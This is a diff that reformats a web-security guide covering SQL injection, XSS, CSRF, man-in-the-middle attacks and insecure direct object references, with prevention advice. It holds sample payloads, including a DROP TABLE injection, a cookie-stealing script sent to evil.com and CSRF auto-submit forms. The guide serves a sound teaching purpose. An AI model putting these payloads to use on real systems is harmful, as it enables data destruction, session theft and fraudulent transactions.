@@ -38,27 +38,29 @@ const query = `SELECT * FROM users WHERE email = '${userInput}'`;
 
 **Attack:**
 
-```
-User input: ' OR '1'='1' --
+User input: `' OR '1'='1' --`
 
 Resulting query:
-SELECT * FROM users WHERE email = '' OR '1'='1' --'
 
-'1'='1' is always true → Returns ALL users
--- comments out the rest → Bypasses any other conditions
+```sql
+SELECT * FROM users WHERE email = '' OR '1'='1' --'
 ```
+
+- `'1'='1'` is always true → Returns ALL users
+- `--` comments out the rest → Bypasses any other conditions
 
 **Destructive attack:**
 
-```
-User input: '; DROP TABLE users; --
+User input: `'; DROP TABLE users; --`
 
 Resulting query:
-SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
 
-→ First query runs (empty result)
-→ Second query DELETES YOUR ENTIRE USERS TABLE
+```sql
+SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
 ```
+
+- First query runs (empty result)
+- Second query **DELETES YOUR ENTIRE USERS TABLE**
 
 ### Prevention
 
@@ -112,8 +114,10 @@ Similar to [SQL Injection](#1-sql-injection), but instead of injecting code into
 **Scenario:** Your site has a comment section that doesn't sanitize input.  
 Attacker posts this "comment":
 
-```javascript
-<script>fetch('https://evil.com/steal?cookie=' + document.cookie);</script>
+```html
+<script>
+	fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
 ```
 
 When any user views the page:  
@@ -170,46 +174,53 @@ Attacker tricks your browser into making requests to a site where you're already
 
 ### How it works
 
-```
-1. You login to bank.com → browser stores auth cookie
-2. You visit evil-site.com (in another tab, or via phishing email)
+1. You login to `bank.com` → browser stores auth cookie
+2. You visit `evil-site.com` (in another tab, or via phishing email)
 3. Evil site has hidden code:
 
-   <img src="https://bank.com/transfer?to=attacker&amount=10000">
-
-   or
-
-   <form action="https://bank.com/transfer" method="POST">
-     <input name="to" value="attacker">
-     <input name="amount" value="10000">
-   </form>
-   <script>document.forms[0].submit();</script>
-
-4. Your browser: "Request to bank.com? I have cookie for that!"
-   → Automatically attaches your auth cookie
-
-5. Bank sees valid cookie → thinks it's you → executes transfer
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
 ```
+
+or:
+
+```html
+<form action="https://bank.com/transfer" method="POST">
+	<input name="to" value="attacker" />
+	<input name="amount" value="10000" />
+</form>
+<script>
+	document.forms[0].submit();
+</script>
+```
+
+4. Your browser: "Request to bank.com? I have cookie for that!" → Automatically attaches your auth cookie
+5. Bank sees valid cookie → thinks it's you → executes transfer
 
 **Key insight:** You never clicked anything on evil-site. Just loading the page was enough.
 
 ### Prevention
 
+**Using sameSite cookie flag:**
+
 ```javascript
-// ✅ Use sameSite cookie flag
 cookies.set('token', value, {
-  sameSite: 'strict',  // Cookie not sent on cross-origin requests
+	sameSite: 'strict' // Cookie not sent on cross-origin requests
 });
-
-// ✅ Alternative: CSRF tokens
-// Server generates unique token per session
-<form action="/transfer" method="POST">
-  <input type="hidden" name="csrf_token" value="random-unique-abc123">
-  ...
-</form>
-
-// Server validates token matches session
 ```
+
+**Using CSRF tokens:**
+
+Server generates unique token per session:
+
+```html
+<form action="/transfer" method="POST">
+	<input type="hidden" name="csrf_token" value="random-unique-abc123" />
+	...
+</form>
+```
+
+Server validates token matches session.
 
 ### sameSite values explained
 
@@ -237,21 +248,20 @@ Attacker intercepts data traveling between your computer and the server.
 
 **On public WiFi (HTTP):**
 
-```
+```text
 Your laptop ──────────────► Coffee shop router ──────────────► Internet
               "accessToken=abc123"
               "password=secret"
                          ↑
                     Attacker's laptop
                     (same network)
-
                     Running Wireshark/tcpdump
                     Sees ALL your data in plain text
 ```
 
 **With HTTPS:**
 
-```
+```text
 Your laptop ──────────────► Coffee shop router ──────────────► Internet
               "x8#kL2$9@mN..."
               (encrypted gibberish)
@@ -377,15 +387,23 @@ User can access other users' data by changing an ID in the URL or request.
 
 ### How it works
 
-```
-Normal request:
-GET /api/invoices/123  ← Your invoice
+**Normal request:**
 
-Attack:
-GET /api/invoices/124  ← Someone else's invoice (oops!)
-GET /api/invoices/125
-GET /api/invoices/126  ← Attacker iterates through all invoices
+```http
+GET /api/invoices/123
 ```
+
+This returns your invoice.
+
+**Attack:**
+
+```http
+GET /api/invoices/124
+GET /api/invoices/125
+GET /api/invoices/126
+```
+
+Attacker iterates through IDs to access other users' invoices.
 
 ### Prevention
 
@@ -447,7 +465,7 @@ const securityHeaders = {
 	// Prevent MIME type sniffing
 	'X-Content-Type-Options': 'nosniff',
 
-	// Enable browser XSS filter
+	// Enable browser XSS filter (legacy - deprecated in modern browsers, use CSP instead)
 	'X-XSS-Protection': '1; mode=block',
 
 	// Control what resources can be loaded
